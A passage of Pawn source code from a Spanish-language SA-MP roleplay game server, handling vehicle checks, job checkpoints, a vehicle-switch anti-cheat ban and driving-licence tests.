		else if(IsPlayerInRangeOfPoint(playerid, 5.0, 1193.81, -1156.84, 23.69))   return 1;
		else if (IsPlayerInRangeOfPoint(playerid, 5.0, 456.63, -1494.42, 30.89))  return 1;
		else if (IsPlayerInRangeOfPoint(playerid, 5.0, 1450.84, -1026.94, 23.62))  return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 5.0, 2089.01, -1824.00, 13.34))   return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 5.0, 1718.75, -1866.16, 13.57))   return 1;
		else if(IsPlayerInRangeOfPoint(playerid, 5.0, 1271.5137, -994.5891, 35.6477))   return 1;
		}
	return 0;
}

LoadObjects(playerid){
	TogglePlayerControllable(playerid, 0); 
	TextDrawShowForPlayer(playerid, streamer);
	SetPVarInt(playerid, "LoadingObjects", 1);
	return SetTimerEx("SafeLoadObjects", 3000, 0, "d", playerid);
}

EsCochePolicial(carid){ for(new v=0;v<sizeof(CochesPolicia);v++){ if(carid == CochesPolicia[v]){ return true; } } return false; }
EsFortCarson(carid){ for(new v=0;v<sizeof(CochesFortCarson);v++){ if(carid == CochesFortCarson[v]){ return true; } } return false; }
Hire_Vehicle(carid){ for(new v=0;v<sizeof(CochesRenta);v++){ if(carid == CochesRenta[v]){ return true; } } return false; }
SAMD_Vehicle(carid){ for(new v=0;v<sizeof(CochesMedicos);v++){ if(carid == CochesMedicos[v]){ return true; } } return false; }
Mecanico_Vehicle(carid){ for(new v=0;v<sizeof(CochesMecanicos);v++){ if(carid == CochesMecanicos[v]){ return true; } } return false; }
CNN_Vehicle(carid){ for(new v=0;v<sizeof(CochesNoticias);v++){ if(carid == CochesNoticias[v]){ return true; } } return false; }
FBI_Vehicle(carid){ for(new v=0;v<sizeof(CochesFbi);v++){ if(carid == CochesFbi[v]){ return true; } } return false; }
Gobierno_Vehicle(carid){ for(new v=0;v<sizeof(CochesGobierno);v++){ if(carid == CochesGobierno[v]){ return true; } } return false; } 
IsAPlane(carid){
	#pragma unused carid
	return false;
}
EsBicicleta(carid)
{
	if(GetVehicleModel(carid) == 509 || GetVehicleModel(carid) ==  481|| GetVehicleModel(carid) == 510) return true;
	return false;
}

EsRutaBus(playerid, rutaid)
{
	switch(rutaid)
	{
		case 1:
		{
			if( IsPlayerInRangeOfPoint(playerid, 10.0, 1056.4014, -1482.7505, 13.4891) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 858.4039, -1393.0964, 13.4165) || 
				IsPlayerInRangeOfPoint(playerid, 10.0, 640.4000, -1345.6577, 13.4798) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 537.6367, -1241.7842, 16.6966) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 171.5627, -1514.4479, 12.3561) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 589.5089, -1742.0437, 13.2290) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 983.2041, -1804.3685, 14.1774) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1123.5647, -1855.0795, 13.4779) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1153.0146, -1641.9800, 13.8852) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1199.1293, -1480.8783, 13.4805) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1320.8348, -1408.8724, 13.3937) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1362.6458, -1107.3684, 23.9130) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1550.4543, -1063.0874, 23.6929) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1737.7354, -1164.2529, 23.7350) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1926.1710, -1138.2739, 25.0615) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 2108.4004, -1108.4307, 25.1831) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 2340.8979, -1156.9491, 27.0879) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 2368.4270, -1344.4429, 23.9369) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 2153.8381, -1381.9397, 23.9330) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1889.5862, -1338.6761, 13.4854) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1794.4263, -1452.5919, 13.4740) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1485.4230, -1438.3306, 13.4872) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1317.4318, -1499.3212, 13.4908) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1294.9037, -1811.0547, 13.4840))return true;
		}
		case 2:
		{
			if( IsPlayerInRangeOfPoint(playerid, 10.0, 1056.404, -1482.7505, 13.4891) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 858.4039, -1393.0964, 13.4165) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 640.4000, -1345.6577, 13.4798) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 537.6367, -1241.7842, 16.6966) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 171.5627, -1514.4479, 12.3561) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 589.5089, -1742.0437, 13.2290) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 983.2041, -1804.3685, 14.1774) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1123.5647, -1855.0795, 13.4779))return true;
		}
		case 3:
		{
			if( IsPlayerInRangeOfPoint(playerid, 10.0, 1342.9044, -1861.4083, 13.4821) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1643.2467, -1875.4707, 13.4853) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1878.5171, -1934.9835, 13.4843) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 2084.7314, -1847.5837, 13.4854) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 2345.4807, -1710.0203, 13.4637) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 2147.7561, -1624.6281, 13.5354) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1896.3553, -1749.1943, 13.4779) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1585.9586, -1729.3464, 13.4818) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1503.5535, -1869.5864, 13.4826) ||
				IsPlayerInRangeOfPoint(playerid, 10.0, 1233.8889, -1849.6936, 13.4788))return true;
		}
	}
	return false;
}

EsAuto(carid)
{
	switch(GetVehicleModel(carid))
	{
		case 400 .. 416, 418 .. 424, 426 .. 429, 431 .. 445, 448, 451, 455 .. 459: return true;
		case 466, 467, 470, 474, 475, 477 .. 480, 482, 483, 485, 489 .. 492, 494 .. 496: return true;
		case 498 .. 500, 502 .. 508, 514 .. 518, 524 .. 536, 540 .. 547, 549 .. 552: return true;
		case 554 .. 562, 565 .. 568, 571 .. 576, 578 .. 580, 582, 583, 585, 587 .. 589: return true;
		case 596 .. 605, 609: return true;
	}
	return false;
}

static GetVehicleSpeed(playerid) 
{
	new Float:vx, Float:vy, Float:vz, Float:vel;
	vel = GetVehicleVelocity(GetPlayerVehicleID(playerid), vx, vy, vz);
	vel = (floatsqroot(((vx*vx)+(vy*vy))+(vz*vz))* 181.5);
	return floatround(vel);
}

public OnPlayerUpdate(playerid)
{
	new vehicleid = GetPlayerVehicleID(playerid);
	if(AntiVehiculoTele[playerid] != 0 && vehicleid != 0)
	{
		if(AntiVehiculoTele[playerid] != vehicleid)
		{
			new tmp15[24], tmp16[32];
			format(tmp16, sizeof(tmp16), "V%dP-V%dS", AntiVehiculoTele[playerid], vehicleid);
			format(tmp15, sizeof(tmp15), "[NPC]%s", nonplayers[random(sizeof(nonplayers))][npcNombre]);
			ban(playerid, "Vehiculos-Hack", tmp15, tmp16);
			return 0;
		}
		AntiVehiculoTele[playerid] = vehicleid;
	}
	if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		if(!EsBicicleta(vehicleid) && GetVehicleSpeed(playerid) >= 100)
		{
			if(vehiculoEncendido[vehicleid] && EsComprable(vehicleid))
			{
				if(Gas[vehicleid] >= 50 && !IsAPlane(vehicleid))
				{
					switch(random(1000))
					{
						case 4, 8, 12, 16:
						{
							Gas[vehicleid] -= 2;
							autos[vehicleid][cBattery] -= 2;
						}
					}
				}
			}
		}
		return 1;
	}
	return 1;
}

public OnVehicleDeath(vehicleid)
{
	GetVehiclePos(vehicleid, gVps[vehicleid][0], gVps[vehicleid][1], gVps[vehicleid][2]);
	if(EsComprable(vehicleid))
	{
		SetVehicleVirtualWorld(vehicleid, vehicleid);
	    SetTimerEx("MostrarVehiculo", 60000, false, "i", vehicleid);
	    SetVehicleHealth(vehicleid, 250.0);
	    autos[vehicleid][cBattery] = 0;
	}
	return 1;
}
public OnPlayerEditDynamicObject(playerid, objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	new ind = enteroChar[rejaID]{playerid};
	switch(response)
	{
		case EDIT_RESPONSE_FINAL:
		{
			if(ind != 255)
			{
				if(enteroChar[rejaPasos]{playerid} == REJA_EDITOR_PASO_B)
				{
					rejas[ind][rePos][6] = x;
					rejas[ind][rePos][7] = y;
					rejas[ind][rePos][8] = z;
					rejas[ind][rePos][9] = rx;
					rejas[ind][rePos][10] = ry;
					rejas[ind][rePos][11] = rz;
					EditDynamicObject(playerid, rejas[ind][reID]);
					enteroChar[rejaPasos]{playerid} = REJA_EDITOR_PASO_C;
					Mensaje(playerid, COLOR_VERDE, "Por favor, colocar la posicion de la reja ABIERTA.");
					return 1;
				}
				else if(enteroChar[rejaPasos]{playerid} == REJA_EDITOR_PASO_C)
				{
					DestroyDynamicObject(rejas[ind][reID]);
					rejas[ind][rePos][0] = x;
					rejas[ind][rePos][1] = y;
					rejas[ind][rePos][2] = z;
					rejas[ind][rePos][3] = rx;
					rejas[ind][rePos][4] = ry;
					rejas[ind][rePos][5] = rz;
					rejas[ind][reID] = CreateDynamicObject(rejas[ind][reModelo], rejas[ind][rePos][6], rejas[ind][rePos][7], rejas[ind][rePos][8], rejas[ind][rePos][9], rejas[ind][rePos][10], rejas[ind][rePos][11]);
					enteroChar[rejaPasos]{playerid} = REJA_EDITOR_PASO_A;
					enteroChar[rejaID]{playerid} = 255;
					ActualizarReja(ind);
					Mensaje(playerid, COLOR_VERDE, "Edicion finalizada.");
					return 1;
				}
			}
		}
	}
	return 1;
}
public OnPlayerEnterDynamicArea(playerid, areaid)
{
	for(new i=0, t=GetMaxPlayers(); i<t; i++)
	{
		if(!IsPlayerConnected(i))continue;
	    if(GetPVarType(i, "BBArea"))
	    {
	        if(areaid == GetPVarInt(i, "BBArea"))
	        {
	            new station[256];
	            GetPVarString(i, "BBStation", station, sizeof(station));
	            if(!isnull(station))
				{
					PlayStream(playerid, station, GetPVarFloat(i, "BBX"), GetPVarFloat(i, "BBY"), GetPVarFloat(i, "BBZ"), 30.0, 1);
				 	Mensaje(playerid, COLOR_AZUL_CLARO, "Atención!:{FFFFFF} Entraste a un área con un stereo encendido.");
	            }
				return 1;
	        }
	    }
	}
	return 1;
}

public OnPlayerLeaveDynamicArea(playerid, areaid)
{
	for(new i=0, t=GetMaxPlayers(); i<t; i++)
	{
		if(!IsPlayerConnected(i))continue;
	    if(GetPVarType(i, "BBArea"))
	    {
	        if(areaid == GetPVarInt(i, "BBArea"))
	        {
	            StopStream(playerid);
	            Mensaje(playerid, COLOR_AZUL_CLARO, "Atención!:{FFFFFF} Saliste del área del stereo encendido.");
				return 1;
	        }
	    }
	}
	return 1;
}

public OnPlayerEnterCheckpoint(playerid)
{
    new carid = GetPlayerVehicleID(playerid), string[128];
	DisablePlayerCheckpoint(playerid);

	//Trabajo de ladron
	if(cuenta[playerid][cTrabajo] == 15 && cuenta[playerid][selecciono])
	{
		new i = cuenta[playerid][selecciono2];
		if(IsPlayerInRangeOfPoint(playerid, 10.0, negocio[i][bExitx], negocio[i][bExity], negocio[i][bExitz]))
		{
			new zona[MAX_ZONE_NAME];
			Get3DZone(negocio[i][bEntrancex], negocio[i][bEntrancey], negocio[i][bEntrancez], zona, MAX_ZONE_NAME);		
			
			format(string, sizeof(string), "** Central: Las camaras han captado un robo en el negocio %s. Zona: %s.", negocio[i][bName], zona);
			SendRadioMessage(1, TEAM_RADIO_COLOR, string);
			
			Mensaje(playerid, COLOR_AMARILLO, "El robo ha comenzado.");
			Mensaje(playerid, COLOR_ROJO, "Debes permanecer cerca de este negocio durante el robo(2 minutos).");
			SetTimerEx("transCargamento", 120000, false, "dd", playerid, 12);
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 10.0, casa[i][hEntrancex], casa[i][hEntrancey], casa[i][hEntrancez]))
		{
			new zona[MAX_ZONE_NAME];
			Get3DZone(casa[i][hEntrancex], casa[i][hEntrancey], casa[i][hEntrancez], zona, MAX_ZONE_NAME);		
			
			format(string, sizeof(string), "** Central: Las camaras han captado un robo en la casa de %s. Zona: %s.", casa[i][hOwner], zona);
			SendRadioMessage(1, TEAM_RADIO_COLOR, string);
			
			SetPosEx(playerid, casa[i][hExitx], casa[i][hExity], casa[i][hExitz], 0, casa[i][hInt], casa[i][hWorld]);
			cuenta[playerid][cEntrada] = i;			

			Mensaje(playerid, COLOR_AMARILLO, "El robo ha comenzado.");
			Mensaje(playerid, COLOR_ROJO, "Debes permanecer dentro de esta casa durante el robo(3 minutos).");
			SetTimerEx("transCargamento", 180000, false, "dd", playerid, 13);
			return 1;
		}
		
		if(cuenta[playerid][selecciono] == 2 && IsPlayerInAnyVehicle(playerid) && IsPlayerInRangeOfPoint(playerid, 10.0, 2611.6138, -2201.5718, -0.2188))
		{
			new dinerorobado = 1200 + random(500);
			format(string, sizeof(string), "Usted ha logrado vender este auto en ~g~%d$~w~, Hulle!", dinerorobado);
			TextoInformatico(15, playerid, string);
			
			SetVehicleHealth(GetPlayerVehicleID(playerid), 300);
			SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			ganaDinero(playerid, dinerorobado);
			cuenta[playerid][cBusqueda] += 2;
			cuenta[playerid][cRobo] = gettime() + 3600;
			Mensaje(playerid, COLOR_GRIS2, "Usted ha recibido +2 nivel de busqueda por el robo.");
			//ZZCASH
			switch(cuenta[playerid][cDonador])
			{
				case 1 .. 4: SetPlayerColor(playerid, 0xFFD70000);
				default: SetPlayerColor(playerid, 0xFFFFFF00);
			}
			
			cuenta[playerid][selecciono] = 0;
			cuenta[playerid][selecciono2] = 0;
			return 1;
		}
		else
		{
			TextoInformatico(15, playerid, "~r~Usted ha fallado en robar el vehiculo");
			
			cuenta[playerid][cBusqueda] += 2;
			Mensaje(playerid, COLOR_GRIS2, "Usted ha recibido +2 nivel de busqueda por el robo fallido.");
			//ZZCASH
			switch(cuenta[playerid][cDonador])
			{
				case 1 .. 4: SetPlayerColor(playerid, 0xFFD70000);
				default: SetPlayerColor(playerid, 0xFFFFFF00);
			}

			cuenta[playerid][selecciono] = 0;
			cuenta[playerid][selecciono2] = 0;
			return 1;
		}
	}
	//trabajo de transportista
	if(cuenta[playerid][servicio])
	{
		new id = cuenta[playerid][selecciono], trab = cuenta[playerid][cTrabajo];
		if(trab == 1 && IsPlayerInAnyVehicle(playerid) && GetVehicleModel(carid) == 428)
		{
			if(IsPlayerInRangeOfPoint(playerid, 10.0, trabTransportador[0][transPos][0], trabTransportador[0][transPos][1], trabTransportador[0][transPos][2]))
			{
				GiveSkillPlayer(playerid, 1);
				trabajoPagar(playerid, 1, trabTransportador[id][transPaga]);
				cuenta[playerid][selecciono] = 0;
				SetVehicleToRespawn(carid);
				DisablePlayerCheckpoint(playerid);
				return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 10.0, trabTransportador[id][transPos][0], trabTransportador[id][transPos][1], trabTransportador[id][transPos][2]))
			{
				SetTimerEx("transCargamento", 10000, false, "dd", playerid, 1);
				GameTextForPlayer(playerid, "~w~Cargando...~n~~w~Espere...", 5000, 3);
				TogglePlayerControllable(playerid, false);
				return 1;
			}
		}
		else if(trab == 2 && IsPlayerInAnyVehicle(playerid) && GetVehicleModel(carid) == 593)
		{
			if(IsPlayerInRangeOfPoint(playerid, 10.0, trabAviador[0][aviPos][0], trabAviador[0][aviPos][1], trabAviador[0][aviPos][2]))
			{
				GiveSkillPlayer(playerid, 2);
				trabajoPagar(playerid, 2, trabAviador[id][aviPaga]);
				cuenta[playerid][selecciono] = 0;
				SetVehicleToRespawn(carid);
				DisablePlayerCheckpoint(playerid);
				return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 10.0, trabAviador[id][aviPos][0], trabAviador[id][aviPos][1], trabAviador[id][aviPos][2]))
			{
				SetTimerEx("transCargamento", 10000, false, "dd", playerid, 2);
				GameTextForPlayer(playerid, "~w~Cargando...~n~~w~Espere...", 5000, 3);
				TogglePlayerControllable(playerid, false);
				return 1;
			}
		}
		else if(trab == 3 && IsPlayerInAnyVehicle(playerid) && GetVehicleModel(carid) == 456 || GetVehicleModel(carid) == 414)
		{
			if(IsPlayerInRangeOfPoint(playerid, 10.0, trabCamionero[0][camPos][0], trabCamionero[0][camPos][1], trabCamionero[0][camPos][2]))
			{
				if(!cuenta[playerid][selecciono2])
				{
					if(trabCamionero[id][camArma])
					{
						switch(random(4))
						{
							case 0:
							{
								darArma(playerid, 22, 5);
								Mensaje(playerid, COLOR_BLANCO, "Usted recibio una {008000}Colt {ffffff}con 5 de municiones.");
							}
							case 1:
							{
								darArma(playerid, 25, 5);
								Mensaje(playerid, COLOR_BLANCO, "Usted recibio una {008000}Escopeta {ffffff}con 5 de municiones.");
							}
							case 2:
							{
								darArma(playerid, 29, 5);
								Mensaje(playerid, COLOR_BLANCO, "Usted recibio una {008000}MP5 {ffffff}con 5 de municiones.");
							}
							case 3:
							{
								darArma(playerid, 30, 5);
								Mensaje(playerid, COLOR_BLANCO, "Usted recibio una {008000}AK-47 {ffffff}con 5 de municiones.");
							}
						}
					}			
					if(trabCamionero[id][camDroga])
					{
						switch(random(5))
						{
							case 0:
							{
								cuenta[playerid][cExtasis] += 2;
								Mensaje(playerid, COLOR_BLANCO, "Usted recibio {008000}+2 {ffffff}gramos de extasis.");
							}
							case 1:
							{
								cuenta[playerid][cMarihuana] += 2;
								Mensaje(playerid, COLOR_BLANCO, "Usted recibio {008000}+2 {ffffff}gramos de marihuana.");
							}
							case 2:
							{
								cuenta[playerid][cSpeed] += 2;
								Mensaje(playerid, COLOR_BLANCO, "Usted recibio {008000}+2 {ffffff}gramos de speed.");
							}
							case 3:
							{
								cuenta[playerid][cHeroina] += 2;
								Mensaje(playerid, COLOR_BLANCO, "Usted recibio {008000}+2 {ffffff}gramos de heroina.");
							}
							case 4:
							{
								cuenta[playerid][cRitalin] += 2;
								Mensaje(playerid, COLOR_BLANCO, "Usted recibio {008000}+2 {ffffff}gramos de ritalin.");
							}
						}
					}
					GiveSkillPlayer(playerid, 3);
					trabajoPagar(playerid, 3, trabCamionero[id][camPaga]);
					cuenta[playerid][selecciono] = 0;
					SetVehicleToRespawn(carid);
					DisablePlayerCheckpoint(playerid);
				}
				else
				{
					cuenta[playerid][selecciono2] = 0;
					DisablePlayerCheckpoint(playerid);
					GameTextForPlayer(playerid, "~w~Cargando....", 10000, 3);
					TogglePlayerControllable(playerid, false);
					SetTimerEx("transCargamento", 10000, false, "dd", playerid, 4);
				}
				return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 10.0, trabCamionero[id][camPos][0], trabCamionero[id][camPos][1], trabCamionero[id][camPos][2]))
			{
				SetTimerEx("transCargamento", 10000, false, "dd", playerid, 3);
				GameTextForPlayer(playerid, "~w~Descargando...~n~~w~Espere...", 5000, 3);
				TogglePlayerControllable(playerid, false);
				return 1;
			}
		}
		else if(trab == 4 && IsPlayerInAnyVehicle(playerid) && GetVehicleModel(carid) == 574)
		{
			if(IsPlayerInRangeOfPoint(playerid, 10.0, trabBarrendero[0][barrPos][0], trabBarrendero[0][barrPos][1], trabBarrendero[0][barrPos][2]))
			{
				GiveSkillPlayer(playerid, 4);
				trabajoPagar(playerid, 4, trabBarrendero[id][barrPaga]);
				cuenta[playerid][selecciono] = 0;
				SetVehicleToRespawn(carid);
				DisablePlayerCheckpoint(playerid);
				return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 10.0, trabBarrendero[id][barrPos][0], trabBarrendero[id][barrPos][1], trabBarrendero[id][barrPos][2]))
			{
				transCargamento(playerid, 5);
				TogglePlayerControllable(playerid, false);
				return 1;
			}
		}
		else if(trab == 5 && IsPlayerInAnyVehicle(playerid) && GetVehicleModel(carid) == 431)
		{
			if(IsPlayerInRangeOfPoint(playerid, 10.0, trabBuses[0][busPos][0], trabBuses[0][busPos][1], trabBuses[0][busPos][2]))
			{
				GiveSkillPlayer(playerid, 5);
				trabajoPagar(playerid, 5, trabBuses[id][busPaga]);
				cuenta[playerid][selecciono] = 0;
				cuenta[playerid][selecciono2] = 0;
				SetVehicleToRespawn(carid);
				DisablePlayerCheckpoint(playerid);
				return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 10.0, trabBuses[id][busPos][0], trabBuses[id][busPos][1], trabBuses[id][busPos][2]))
			{
				GameTextForPlayer(playerid, "~w~Pasajeros subiendo...~n~~w~Espere...", 5000, 3);
				SetTimerEx("transCargamento", 4000, false, "dd", playerid, 6);
				TogglePlayerControllable(playerid, false);
				return 1;
			}
			else if(cuenta[playerid][selecciono])
			{
				if(EsRutaBus(playerid, cuenta[playerid][selecciono]))
				{
					GameTextForPlayer(playerid, "~w~Pasajeros subiendo...~n~~w~Espere...", 5000, 3);
					SetTimerEx("transCargamento", 4000, false, "dd", playerid, 6);
					TogglePlayerControllable(playerid, false);
					return 1;
				}
			}
		}
		else if(trab == 6 && IsPlayerInAnyVehicle(playerid) && GetVehicleModel(carid) == 532)
		{
			comenzarCosechar(playerid);
			return 1;
		}
		else if(trab == 7 && IsPlayerInAnyVehicle(playerid) && GetVehicleModel(carid) == 448)
		{
			if(IsPlayerInRangeOfPoint(playerid, 10.0, casa[id][hEntrancex], casa[id][hEntrancey], casa[id][hEntrancez]))
			{
				new paga = 50 + random(30);
				GiveSkillPlayer(playerid, 7);
				trabajoPagar(playerid, 7, paga);
				format(string, sizeof(string), "* %s saca su billetera y paga %d$ a %s", casa[id][hOwner], paga, PlayerName(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				format(string, sizeof(string), "%s dice: Gracias por la pizza, hasta luego.", casa[id][hOwner]);
				ProxDetector(30.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
				
				cuenta[playerid][selecciono] = 0;
				cuenta[playerid][selecciono2] = 0;
				return 1;
			}
		}
		else if(trab == 8 && IsPlayerInAnyVehicle(playerid) && GetVehicleModel(carid) == 538)
		{
			if(IsPlayerInRangeOfPoint(playerid, 10.0, 2646.5356, 2178.7378, -0.6937))
			{
				SetPlayerCheckpoint(playerid, 1700.7649, -1953.6531, 14.8756, 7.0);
				TextoInformatico(25, playerid, "La estacion fue marcada en su ~g~minimapa~w~.");
			}
			else if(IsPlayerInRangeOfPoint(playerid, 10.0, 1700.7649, -1953.6531, 14.8756))
			{
				new paga = 750;
				GiveSkillPlayer(playerid, 8);
				trabajoPagar(playerid, 8, paga);
				cuenta[playerid][selecciono] = 0;
				cuenta[playerid][selecciono2] = 0;
				SetVehicleToRespawn(carid);
				DisablePlayerCheckpoint(playerid);
			}
		}
		else if(trab == 10 && IsPlayerInAnyVehicle(playerid) && GetVehicleModel(carid) == 408)
		{
			recogerBasura(playerid);
		}		
		else if(trab == 11 && IsPlayerInAnyVehicle(playerid) && GetVehicleModel(carid) == 453)
		{
			TogglePlayerControllable(playerid, false);
			SetTimerEx("transCargamento", 5000, false, "dd", playerid, 8);
			GameTextForPlayer(playerid, cuenta[playerid][selecciono] < 4 ? ("~w~Pescando...~n~~w~Espere...") : ("DESCARGANDO PESCA...~n~~w~Espere..."), 5000, 3);
		}
		else if(trab == 12 && IsPlayerInRangeOfPoint(playerid, 5.0, trabMinero[2][minPos][0], trabMinero[2][minPos][1], trabMinero[2][minPos][2]))
		{
			new paga = 80 + random(50);
			cuenta[playerid][pagas] += paga;
			format(string, sizeof(string), "Usted recibio ~g~%d$ ~w~por este mineral, acumulado ~g~%d$", paga, cuenta[playerid][pagas]);
			TextoInformatico(20, playerid, string);
			cuenta[playerid][selecciono] = 0;
			cuenta[playerid][selecciono2] = 0;
			RemovePlayerAttachedObject(playerid, 8);
			ClearAnimations(playerid, 1);
		}		
		else if(trab == 13 && IsPlayerInRangeOfPoint(playerid, 5.0, trabCarpintero[0][carPos][0], trabCarpintero[0][carPos][1], trabCarpintero[0][carPos][2]))
		{
			new paga = 75 + random(35);
			cuenta[playerid][pagas] += paga;
			format(string, sizeof(string), "Usted recibio ~g~%d$ ~w~por este mueble, acumulado ~g~%d$", paga, cuenta[playerid][pagas]);
			TextoInformatico(20, playerid, string);
			cuenta[playerid][selecciono] = 0;
			cuenta[playerid][selecciono2] = 0;
			RemovePlayerAttachedObject(playerid, 8);
			ClearAnimations(playerid, 1);
		}
	}
	return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
	if(IsPlayerInAnyVehicle(playerid))
	{
		if(enteroChar[lictipo]{playerid} != 255)
		{
			switch(enteroChar[lictipo]{playerid})
			{
				case 0, 1:
				{
					enteroChar[licestado]{playerid}++;
					switch(enteroChar[licestado]{playerid})
					{
						case 1: SetPlayerRaceCheckpoint(playerid, 0, 1394.8308, -1.6123, 1000.6443, 1365.7014, -19.2223, 1000.6489, 3.0);
						case 2: SetPlayerRaceCheckpoint(playerid, 0, 1365.7014, -19.2223, 1000.6489, 1373.3943, -36.4012, 1000.6483, 3.0);
						case 3: SetPlayerRaceCheckpoint(playerid, 0, 1373.3943, -36.4012, 1000.6483, 1406.2656, -45.8226, 1000.6423, 3.0);
						case 4: 
						{
							if(enteroChar[licvueltas]{playerid} >= 4)
							{
								SetPlayerRaceCheckpoint(playerid, 1, 1406.2656, -45.8226, 1000.6423, 0.0, 0.0, 0.0, 3.0);
							}
							else
							{
								SetPlayerRaceCheckpoint(playerid, 0, 1406.2656, -45.8226, 1000.6423, 1390.3795, -27.3216, 1000.6432, 3.0);
							}
						}
						case 5:
						{
							if(enteroChar[licvueltas]{playerid} >= 4)
							{
								new string[126], vehicle = GetPlayerVehicleID(playerid), Float:vehvida;
								GetVehicleHealth(vehicle, vehvida);
								
								switch(GetVehicleModel(vehicle))
								{
									case 410:
									{
										if(gettime() - entero[playerid][lictiempo] > 200 || vehvida <= 600)
										{
											Mensaje(playerid, COLOR_ROJO, "|____EXAMEN REPROBADO____|");
											
											format(string, sizeof(string), "Daños: %.0f", 1000 - vehvida);
											Mensaje(playerid, COLOR_BLANCO, string);
											
											format(string, sizeof(string), "Tiempo: %s", generarTiempo(gettime() - entero[playerid][lictiempo]));
											Mensaje(playerid, COLOR_BLANCO, string);
										}
										else
										{
											Mensaje(playerid, COLOR_VERDE, "|____EXAMEN APROBADO____|");
											
											format(string, sizeof(string), "Daños: %.0f", 1000 - vehvida);
											Mensaje(playerid, COLOR_BLANCO, string);
											
											format(string, sizeof(string), "Tiempo: %s", generarTiempo(gettime() - entero[playerid][lictiempo]));
											Mensaje(playerid, COLOR_BLANCO, string);
											
											cuenta[playerid][cLicenciaAuto] = 1;
										}
									}
									case 586:
									{
										if(gettime() - entero[playerid][lictiempo] > 130 || vehvida <= 900)
										{
											Mensaje(playerid, COLOR_ROJO, "|____EXAMEN REPROBADO____|");
											
											format(string, sizeof(string), "Daños: %.0f", 1000 - vehvida);
											Mensaje(playerid, COLOR_BLANCO, string);
											
											format(string, sizeof(string), "Tiempo: %s", generarTiempo(gettime() - entero[playerid][lictiempo]));
											Mensaje(playerid, COLOR_BLANCO, string);
										}
										else
										{
											Mensaje(playerid, COLOR_VERDE, "|____EXAMEN APROBADO____|");
											
											format(string, sizeof(string), "Daños: %.0f", 1000 - vehvida);
											Mensaje(playerid, COLOR_BLANCO, string);
											
											format(string, sizeof(string), "Tiempo: %s", generarTiempo(gettime() - entero[playerid][lictiempo]));
											Mensaje(playerid, COLOR_BLANCO, string);
											
											cuenta[playerid][cLicenciaMoto] = 1;
										}
									}
								}
								SetPosEx(playerid, 2048.1421, -1908.2161, 13.5469, 267.6207, 0, 0);
								terminarPrueba(playerid);
							}
							else
							{
								enteroChar[licvueltas]{playerid}++;
								enteroChar[licestado]{playerid} = 0;
								SetPlayerRaceCheckpoint(playerid, 0, 1390.3795, -27.3216, 1000.6432, 1394.8308, -1.6123, 1000.6443, 3.0);
							}
						}
					}
				}
				case 2:
				{
					enteroChar[licestado]{playerid}++;
					switch(enteroChar[licestado]{playerid})
					{
						case 1: SetPlayerRaceCheckpoint(playerid, 3, -63.9375, 2508.9941, 91.6324, -316.5374, 2429.5198, 131.4340, 6.0);
						case 2: SetPlayerRaceCheckpoint(playerid, 3, -316.5374, 2429.5198, 131.4340, -394.1963, 2067.6755, 160.1145, 6.0);
						case 3: SetPlayerRaceCheckpoint(playerid, 3, -394.1963, 2067.6755, 160.1145, -599.5220, 1818.0098, 159.3034, 6.0);
						case 4: SetPlayerRaceCheckpoint(playerid, 3, -599.5220, 1818.0098, 159.3034, -928.8336, 1895.7354, 204.3688, 6.0);
						case 5: SetPlayerRaceCheckpoint(playerid, 3, -928.8336, 1895.7354, 204.3688, -1193.4266, 2083.7129, 171.5246, 6.0);
						case 6: SetPlayerRaceCheckpoint(playerid, 3, -1193.4266, 2083.7129, 171.5246, -1376.0507, 2448.2119, 147.9311, 6.0);
